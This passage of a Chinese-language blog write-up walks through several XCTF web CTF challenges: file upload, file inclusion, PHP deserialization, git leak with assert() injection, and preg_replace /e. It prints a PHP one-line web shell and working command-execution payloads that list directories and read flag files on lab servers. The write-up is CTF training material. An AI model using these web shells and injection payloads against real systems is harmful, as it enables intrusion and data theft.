<p>编写一个图片🐎b.jpg：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'cmd'</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>bypass前端后通过BP抓包修改</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_2.jpg" srcset="/img/loading.gif" lazyload class="">

<p>回显：<code>upload success : upload/1667464623.b.php</code></p>
<p>通过蚁剑连接：<code>http://61.147.171.105:50598/upload/1667464623.b.php</code>   密码为：<code>cmd</code></p>
<p>找到flag</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/upload1_1.jpg" srcset="/img/loading.gif" lazyload class="">



<h4 id="10-文件包含-泰山杯"><a href="#10-文件包含-泰山杯" class="headerlink" title="10_文件包含 泰山杯"></a>10_文件包含 泰山杯</h4><h5 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h5><p>文件包含题，进入直接一段php代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-string">"./check.php"</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>])){<br>        <span class="hljs-variable">$filename</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'filename'</span>];<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>);<br>    }<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>


<h5 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h5><p>很明显，要提交一个filename参数进去。</p>
<p>首先，随便提交一个payload，<code>filename=flag.php</code></p>
<p>有回显：<code>you have use the right usage , but error method</code></p>
<p>然后尝试一下php伪协议，payload：<code>filename=php://filter/read=convert.base64-encode/resource=check.php</code></p>
<p>有回显：<code>do not hack!</code>，说明是有过滤的。继续构造payload<code>filename=php://filter/read</code>，还是被过滤，说明是read被过滤掉了,同样的发现base64被过滤。</p>
<p>尝试后发现<code>convert.iconv.</code>未被过滤，那么可以使用BP对iconv中的两个字段爆破，使用提前编写好的字典。</p>
<p><strong>将<code>.iconv</code>的两个可选参数标为payload，并且选择<code>Cluster bomb</code>模式，设置好字典为准备好的.txt文件。爆破出来选择最长的response查看。</strong></p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_3.jpg" srcset="/img/loading.gif" lazyload class="">

<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_2.jpg" srcset="/img/loading.gif" lazyload class="">

<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/fileinclude_taishanbei_1.jpg" srcset="/img/loading.gif" lazyload class="">



<h4 id="11"><a href="#11" class="headerlink" title="11_"></a>11_</h4><h5 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h5><p>直接可以看到代码，检查网页源码也是一样</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>{<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">'111'</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);<br>}<br>?code=<br></code></pre></td></tr></table></figure>

<h5 id="知识点-9"><a href="#知识点-9" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li><p>PHP反序列化编写格式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//反序列化数组，a是数组的意思</span><br>a:<span class="hljs-number">3</span>:{i:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"4444"</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"123"</span>;}<br><span class="hljs-comment">//反序列化对象，O是对象的意思</span><br>O:<span class="hljs-number">4</span>:<span class="hljs-string">"xctf"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"fall"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"flag"</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"111"</span>;}<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>__wakeup函数的bypass：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行</strong></p>
</li>
</ul>
<h5 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h5><p>很显然只是显示了部分代码，只有给出的code可以操作，那么传一个code参数上去</p>
<p><code>code=111</code>,回显<code>you should not type an integer</code>，告诉我们不传整型，且说明code变量是可用的。</p>
<p>这是一个反序列化的问题。</p>
<p>反序列化构造：<code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code>，这样行不通，会调用wakeup函数</p>
<p>利用PHP漏洞：序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行，</p>
<p>传入：<code>O:4:"xctf":2:{s:4:"flag";s:3:"111";}</code></p>
<p>回显：<code>the answer is : cyberpeace{475ed74daf373a5a3a3fe01821af26e4}</code></p>
<h4 id="12-Web-php-include-CTF"><a href="#12-Web-php-include-CTF" class="headerlink" title="12_Web_php_include_CTF"></a>12_Web_php_include_CTF</h4><h5 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h5><p>进去就是一段代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'hello'</span>];<br><span class="hljs-variable">$page</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>];<br><span class="hljs-keyword">while</span> (<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">"php://"</span>)) {<br>    <span class="hljs-variable">$page</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"php://"</span>, <span class="hljs-string">""</span>, <span class="hljs-variable">$page</span>);<br>}<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="知识点-10"><a href="#知识点-10" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li><p>PHP函数——<strong>strstr</strong>：搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p>
</li>
<li><p>PHP函数——<strong>str_replace</strong>：以其他字符替换字符串中的一些字符</p>
</li>
<li><h5 id="PHP伪协议：data-类似php-input，可以让用户来控制输入流，用户输入的data-流会被当作php文件执行，从而执行我们想要执行的代码。要求allow-url-fopen-On，allow-url-include-On"><a href="#PHP伪协议：data-类似php-input，可以让用户来控制输入流，用户输入的data-流会被当作php文件执行，从而执行我们想要执行的代码。要求allow-url-fopen-On，allow-url-include-On" class="headerlink" title="==PHP伪协议：data://==:类似php://input，可以让用户来控制输入流，用户输入的data://流会被当作php文件执行，从而执行我们想要执行的代码。要求allow_url_fopen=On，allow_url_include=On"></a>==<strong>PHP伪协议：data://</strong>==:类似php://input，可以让用户来控制输入流，用户输入的data://流会被当作php文件执行，从而执行我们想要执行的代码。要求allow_url_fopen=On，allow_url_include=On</h5></li>
<li><p>var_dump用于显示字符串</p>
</li>
</ul>
<h5 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h5><p>题目的意思很明显，我们要传一个GET类型的page参数上去，然后其会替换page里面的php://为空，防止我们显示文件内容。那么我们使用data://就好了。</p>
<p>首先构造payload:<code>?page=data://text/plain,&lt;?php exec('ls',$result);var_dump($result);?&gt;</code></p>
<p>获得如下回显：</p>
<p><code>array(3) { [0]=&gt; string(18) "fl4gisisish3r3.php" [1]=&gt; string(9) "index.php" [2]=&gt; string(11) "phpinfo.php" }</code></p>
<p><code>data://text/plain,&lt;?php echo $page?&gt;</code></p>
<p>很显然，我们的flag应该在<code>fl4gisisish3r3.php</code>文件里，那么我们cat一下文件里的内容就行了。</p>
<p>再构造payload：<code>?page=data://text/plain,&lt;?php exec('cat fl4gisisish3r3.php',$result);var_dump($result);?&gt;</code></p>
<p>获得如下回显：<code>array(3) { [0]=&gt; string(5) " string(50) "$flag="ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}";" [2]=&gt; string(2) "?&gt;" }</code>，找到flag.</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/Web_php_include_CTF_1.jpg" srcset="/img/loading.gif" lazyload class="">

<p>ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}</p>
<h4 id="13-Web-php-unserialize（题解未写完）"><a href="#13-Web-php-unserialize（题解未写完）" class="headerlink" title="13_Web_php_unserialize（题解未写完）"></a>13_Web_php_unserialize（题解未写完）</h4><h5 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a>描述</h5><p>进去一段PHP代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>{ <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">'index.php'</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>{ <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    }<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{ <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    }<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>{ <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">'index.php'</span>) { <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">'index.php'</span>; <br>        } <br>    } <br>}<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>])) { <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'var'</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/[oc]:\d+:/i'</span>, <span class="hljs-variable">$var</span>)) { <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'stop hacking!'</span>); <br>    } <span class="hljs-keyword">else</span> {<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    } <br>} <span class="hljs-keyword">else</span> { <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">"index.php"</span>); <br>} <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="知识点-11"><a href="#知识点-11" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li>wakeup函数的绕过方法</li>
<li>O:+6绕过对O的正则匹配</li>
<li><strong>字符逃逸问题</strong></li>
</ul>
<h5 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h5><p>反序列化题，注意到<code>__destruct里有一个highlight_file</code>，这里就是出flag的地方。</p>
<p>显然，题目已经告诉我们secret在fl4g.php里，我们不妨先想办法去看看再说，</p>
<p>上传一个GET参数var，首先会被base64解码，然后会被正则过滤关键字，这里需要绕过，然后就被反序列化了，开始调用一个<code>wakeup</code>函数，会判断file参数是否是index，不是则置为index，这里也需要绕过，总共两个绕过点。</p>
<p>wakeup函数很好绕过，关键是正则匹配，<code>/[oc]:\d+:/</code>，这里的意思是匹配<code>o:数字:</code>，所以我们序列化中的<code>o:4</code>，就需要改一下。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">'fl4g.php'</span>);<br><span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'O:4'</span>,<span class="hljs-string">'O:+4'</span>,<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-variable">$s</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'1:'</span>,<span class="hljs-string">'2:'</span>,<span class="hljs-variable">$s</span>);<br><span class="hljs-keyword">echo</span> base64-<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$s</span>);<br><span class="hljs-comment">//O:+4:"Demo":2:{s:10:"Demofile";s:8:"fl4g.php";}</span><br><span class="hljs-comment">//TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></code></pre></td></tr></table></figure>

<p>payload就为<code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></p>
<h4 id="14-MFW（git泄露）"><a href="#14-MFW（git泄露）" class="headerlink" title="14_MFW（git泄露）"></a>14_MFW（git泄露）</h4><h5 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a>描述</h5><p>进去是一个个人网站的样子。跳转到About页面时，出现：</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_1.jpg" srcset="/img/loading.gif" lazyload class="">

<p>使用了Git，说明开发者使用Git进行版本控制，很可能会存在Git引起的文件泄露问题。</p>
<h5 id="知识点-12"><a href="#知识点-12" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li><p>Git引起的文件泄露</p>
</li>
<li><p>PHP函数：str_pos:</p>
</li>
<li><p><strong>PHP函数：assert:</strong></p>
<ul>
<li><p>书写格式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//PHP5,7</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span> = ?): <span class="hljs-keyword">bool</span><br><span class="hljs-comment">//PHP7</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span>, <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$exception</span> = ?): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert() 当做 PHP 代码来执行</strong>。如果传入了 boolean 的条件作为 <code>assertion</code>，这个条件将不会显示为断言函数的参数；在调用你定义的assert_options处理函数时，条件会转换为字符串，而布尔值 <strong><code>false</code></strong> 会被转换成空字符串</p>
</li>
</ul>
</li>
<li></li>
</ul>
<h5 id="思路-13"><a href="#思路-13" class="headerlink" title="思路"></a>思路</h5><p>可能是Git泄露，尝试在浏览器访问：<code>/.git/</code>，结果出现了回显，说明猜测正确。我们使用git hack获取服务器上用git管理的文件</p>
<p>首先在命令行中进入githack目录下，使用<code>python GitHack.py http://61.147.171.105:56499/.git/</code>，之后会在git hack目录下生成获取到的文件的文件夹。</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/mfw_2.jpg" srcset="/img/loading.gif" lazyload class="">  

<p>获得的index.php代码如下：省略html部分</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>])) {<br>	<span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>];<br>} <span class="hljs-keyword">else</span> {<br>	<span class="hljs-variable">$page</span> = <span class="hljs-string">"home"</span>;<br>}<br><span class="hljs-variable">$file</span> = <span class="hljs-string">"templates/"</span> . <span class="hljs-variable">$page</span> . <span class="hljs-string">".php"</span>;<br><span class="hljs-comment">// I heard '..' is dangerous!</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">"strpos('<span class="hljs-subst">$file</span>', '..') === false"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Detected hacking attempt!"</span>);<br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">"file_exists('<span class="hljs-subst">$file</span>')"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"That file doesn't exist!"</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>发现了<code>assert</code>函数，可以通过其来执行PHP代码，这里就是解题的关键。</p>
<p>构造payload：<code>fff')</code>用于闭合assert函数</p>
<p><code>fff') or exec("ls",$result);var_dump($result);//</code>          不行</p>
<p><code>fff') or include("data://text/plain,&lt;?php exec("ls",$result);var_dump($result);?&gt;");</code>      不行</p>
<p><code>fff') or system("cat templates/flag.php")//</code>      可行</p>
<h4 id="15-ics-05"><a href="#15-ics-05" class="headerlink" title="15_ics_05"></a>15_ics_05</h4><h5 id="描述-13"><a href="#描述-13" class="headerlink" title="描述"></a>描述</h5><p>是一个实际场景，只有设备维护中心的page能被点开</p>
<h5 id="知识点-13"><a href="#知识点-13" class="headerlink" title="知识点"></a>知识点</h5><ul>
<li><p>文件包含</p>
</li>
<li><p><strong>ctype_alnum() 函数检测字符串是否全部为字母和(或)数字字符，如果文本中的每个字符都是字母或数字，则返回TRUE，否则返回FALSE。</strong></p>
</li>
<li><p><strong>==正则表达式的修饰符：==</strong></p>
<p><strong>i：</strong>ignore-不区分大小写			<strong>g：</strong>global-全局匹配			<strong>m：</strong>multi line-多行匹配</p>
</li>
<li><p>preg_replace函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">mixed</span> <span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] )<br></code></pre></td></tr></table></figure>

<ul>
<li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li>
<li>$replacement: 用于替换的字符串或字符串数组。</li>
<li>$subject: 要搜索替换的目标字符串或字符串数组。</li>
<li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li>
<li>$count: 可选，为替换执行的次数。</li>
<li>==<strong>/e参数：可以传入 /e 的修饰符，然后让代码执行</strong>==</li>
</ul>
</li>
</ul>
<h5 id="思路-14"><a href="#思路-14" class="headerlink" title="思路"></a>思路</h5><p>首先检查网页源码，只有html没有php，没用，所以我们第一个任务是找到php源码，首先访问一下index.phps，返回400，没用，看一下有没有git泄露，访问<code>/.git/</code>也没有，那就继续看看页面有没有什么可以交互的地方，发现点击标题的时候，页面发生了变化。url多了一个<code>/?page=index.php</code>，页面也出现了index，<strong>那么后端有一个page点可以交互，目前能想到的有两种，sql注入和文件包含漏洞</strong>，能排除sql注入，因为修改payload为<code>page=hhh</code>时，页面直接回显hhh，说明是没有走数据库的。那么就文件包含了，payload如下：</p>
<p>**<code>page=php://filter/read=convert.base64-enocode/resource=index.php</code>**，然后直接就扒出index.php经过base64-encode编码后的源码，很顺利，居然没有过滤需要绕过，然后我们解码就可以得到源码了。</p>
<img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/ics05_1.jpg" srcset="/img/loading.gif" lazyload class="">

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">posix_setuid</span>(<span class="hljs-number">1000</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[page];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>)) {<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alnum</span>(<span class="hljs-variable">$page</span>)) {}<br>}<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$page</span>; <span class="hljs-keyword">die</span>();<span class="hljs-meta">?&gt;</span>&lt;/p&gt;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">else</span>{}<br><span class="hljs-meta">?&gt;</span><br>    <span class="hljs-meta">&lt;?php</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">'input'</span>) &gt; <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">'ta:text'</span>) &gt; <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$page</span>, <span class="hljs-string">'text'</span>) &gt; <span class="hljs-number">0</span>) {<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$page</span> === <span class="hljs-string">'index.php'</span>) {<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">'Ok'</span>);<br>    }<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$page</span>);<br>    <span class="hljs-keyword">die</span>();<br>    <span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="hljs-string">'127.0.0.1'</span>) {<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;<br><br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-variable">$_GET</span>[pat];<br>    <span class="hljs-variable">$replacement</span> = <span class="hljs-variable">$_GET</span>[rep];<br>    <span class="hljs-variable">$subject</span> = <span class="hljs-variable">$_GET</span>[sub];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$pattern</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$replacement</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$subject</span>)) {<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$replacement</span>, <span class="hljs-variable">$subject</span>);<br>    }<span class="hljs-keyword">else</span>{<br>        <span class="hljs-keyword">die</span>();<br>    }<br><br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>其实看完源码可以发现，首先是有字符串的过滤检测的，但是刚好没有php的伪协议，所以很顺利地得到了源码。解题的关键应该是有注释后的那部分代码。</p>
<p>有一个X-Forward-For的检测，用插件绕过就行或者用BP自己写一下，然后有三个参数：<code>pat,rep,sub</code>，被<code>preg_replace</code>函数调用，可以使用/e参数一段PHP代码，</p>
<p>payload:<code>?pat=/a/e&amp;rep=system("cat index.php");&amp;sub=a</code>，</p>
<p>有index.php的回显，说明可行，</p>
<p>那么继续构造payload：<code>?pat=/a/e&amp;rep=system("ls");&amp;sub=a</code>，</p>
<p>有回显<code>css index.html index.php js layui logo.png s3chahahaDir start.sh 视图.png</code>，东西大概率在<code>s3chahahahaDir</code>里，进去看看，果然有flag，也是个目录，里面有flag.php。</p>
<p>构造payload：<code>?pat=/a/e&amp;rep=system("cat s3chahahaDir/flag/flag.php");&amp;sub=a</code></p>
<p>在源码里出现了flag：cyberpeace{38067f93cbfb9366ec43674ebac38457}</p>
<h4 id="16-PHP-RCE"><a href="#16-PHP-RCE" class="headerlink" title="16_PHP_RCE"></a>16_PHP_RCE</h4><h5 id="描述-14"><a href="#描述-14" class="headerlink" title="描述"></a>描述</h5><img src="/2023/11/13/CTF-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-WEB-WP/php_rce_1.jpg" srcset="/img/loading.gif" lazyload class="">

<h5 id="知识点-14"><a href="#知识点-14" class="headerlink" title="知识点"></a>知识点</h5><ul>
